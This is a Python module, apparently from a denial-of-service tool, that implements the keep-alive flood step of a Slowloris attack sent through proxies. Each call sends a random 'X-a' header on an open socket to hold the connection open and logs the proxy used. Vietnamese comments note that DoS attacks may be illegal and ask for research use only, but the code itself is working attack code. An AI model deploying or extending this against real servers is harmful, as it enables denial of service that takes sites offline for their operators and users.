"""This module provides the flood function for a Slowloris DoS attack through proxies.

Lưu ý: Việc tấn công DoS có thể vi phạm pháp luật. Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường hợp pháp.
"""

import random
import socket
import logging
from typing import Dict
from colorama import Fore as F

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def flood(sock: socket.SocketType, proxy: Dict[str, str]) -> None:
    """Keep the socket alive in a Slowloris flood attack through proxies.

    Args:
        sock (socket.SocketType): The socket to be kept alive.
        proxy (Dict[str, str]): The proxy to be used, expected to have keys 'addr' and 'port'.

    Returns:
        None
    """
    try:
        # Lấy địa chỉ và cổng của socket
        laddr, port = sock.getsockname()
        
        # Sinh giá trị header ngẫu nhiên và gửi qua socket để giữ kết nối
        random_header = random.randint(1, 5000)
        sock.send(f"X-a: {random_header}\r\n".encode("utf-8"))
        
        # Tạo thông báo log hiển thị thông tin proxy và header đã gửi
        proxy_addr = f"{F.RESET}|{F.RESET} Proxy: {F.BLUE}{proxy.get('addr', 'N/A')}:{proxy.get('port', 'N/A'):>5}"
        header_sent = f"{F.RESET} Header Sent: {F.BLUE}X-a {random_header:>4}"
        
        logging.info("Socket: %s:%s %s | %s", laddr, port, proxy_addr, header_sent)
        
    except (BrokenPipeError, socket.error) as e:
        logging.error("%s[!] Socket error: %s%s", F.RED, e, F.RESET)
        try:
            sock.close()
            logging.info("Socket closed successfully.")
        except Exception as close_err:
            logging.error("%s[!] Error closing socket: %s%s", F.RED, close_err, F.RESET)